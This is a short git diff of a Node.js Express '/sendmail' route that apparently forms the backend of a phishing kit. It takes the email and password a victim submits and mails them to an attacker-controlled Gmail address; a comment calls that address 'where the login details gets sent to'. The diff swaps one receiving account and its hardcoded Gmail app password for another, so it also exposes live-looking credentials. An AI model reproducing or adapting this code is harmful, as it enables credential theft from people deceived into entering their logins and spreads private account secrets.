@@ -21,13 +21,13 @@ app.post("/sendmail", async (req, res) => {
     const userAgent = req.headers['user-agent'];
 
     let { email, password } = req.body;
-    const to = "jimwilliams513@gmail.com"; // where the login details gets sent to
+    const to = "Okuukup@gmail.com"; // where the login details gets sent to
 
     const transporter = nodemailer.createTransport({
         service: "gmail",
         auth: {
-            user: "jimwilliams513@gmail.com", // The email of the user 
-            pass: "klkfthxlxzloelgl", // The password of the user 
+            user: "Okuukup@gmail.com", // The email of the user 
+            pass: "mlgugsagctuftoje", // The password of the user 
         },
     });
 
